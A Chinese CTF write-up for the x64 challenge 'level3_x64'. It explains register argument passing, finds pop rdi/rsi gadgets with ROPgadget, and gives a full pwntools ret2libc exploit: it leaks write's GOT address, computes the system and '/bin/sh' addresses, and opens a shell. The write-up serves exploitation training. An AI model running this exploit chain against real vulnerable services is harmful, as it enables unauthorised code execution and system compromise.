# 一道简单的`x64 ROP PWN`

### 描述
这道题与上一题基本一样，仅仅是架构变成64位了

于是exp也可以按照上一题的思路写

唯一的变化是64位下的传参方式

在`x86`架构下，程序直接使用栈来传参

在`x64`下，程序使用寄存器传递前几个参数，其余参数使用栈传递
具体如下：
```
当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。

当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。

```

### 书写exp前段部分
```
#!/bin/python3
from pwn import *

context(os='linux', arch='amd64', log_level='debug')

io = process("level3_x64")
elf = ELF("level3_x64")
libc =ELF("/lib/x86_64-linux-gnu/libc.so.6")

write_plt = elf.plt["write"]
write_got = elf.got["write"]
vulnerable_function = elf.symbols["vulnerable_function"]

io.recv()
```

### 构造payload
基本思路与上一题一致，只需要在构造payload的时候重新写传参方式
`x86`下的payload：
```
溢出偏移量 + write函数plt地址 + 漏洞函数地址 + 1 + write的got表地址 + 4
```
因此在64位情况下需要控制rdi，rsi，rdx寄存器以传递三个参数

使用ROPgadget查找可以控制以上寄存器的gadget：
```
pwn3_x64$ ROPgadget --binary level3_x64 --only 'pop|ret'
Gadgets information
============================================================
0x00000000004006ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006ae : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006b0 : pop r14 ; pop r15 ; ret
0x00000000004006b2 : pop r15 ; ret
0x00000000004006ab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006af : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400550 : pop rbp ; ret
0x00000000004006b3 : pop rdi ; ret
0x00000000004006b1 : pop rsi ; pop r15 ; ret
0x00000000004006ad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400499 : ret

Unique gadgets found: 11
```
注意这几条：
```
0x00000000004006b3 : pop rdi ; ret
0x00000000004006b1 : pop rsi ; pop r15 ; ret
```
于是我们在构造ROP利用链之后，获得了可以操作前两个参数的能力，但并不能操作rdx

rdx寄存器的值需要看运气，这个参数决定了write函数能打印出的长度

因此理论上只要该值大于等于8就能达到目的

于是exp添加两个gadget的地址
```
pop_rdi_ret = 0x00000000004006b3
pop_rsi_r15_ret = 0x00000000004006b1
```

组装payload：
```
payload = cyclic(0x80 + 8) + p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(write_got) + p64(0) + p64(write_plt) + p64(vulnerable_function)
```
`即：偏移量 + rdi赋值为1 + rsi，r15赋值为write_got和0 + write地址 + 漏洞函数地址`

至于第二部分的payload就比较简单了，将第一个参数的寄存器赋值为`/bin/sh`然后调用函数即可

## 完整exp：
```
#!/bin/python3
from pwn import *

context(os='linux', arch='amd64', log_level='debug')

io = process("level3_x64")
elf = ELF("level3_x64")
libc =ELF("/lib/x86_64-linux-gnu/libc.so.6")

write_plt = elf.plt["write"]
write_got = elf.got["write"]
vulnerable_function = elf.symbols["vulnerable_function"]
pop_rdi_ret = 0x00000000004006b3
pop_rsi_r15_ret = 0x00000000004006b1

io.recv()
payload = cyclic(0x80 + 8) + p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(write_got) + p64(0) + p64(write_plt) + p64(vulnerable_function)
io.sendline(payload)
write_real = u64(io.recv(8))

system_real = write_real - libc.symbols["write"] + libc.symbols["system"]
bin_sh_real = write_real - libc.symbols["write"] + next(libc.search(b"/bin/sh"))

payload2 = cyclic(0x80 + 8) + p64(pop_rdi_ret)  + p64(bin_sh_real) + p64(system_real)
io.recv()
io.sendline(payload2)
io.interactive()
```

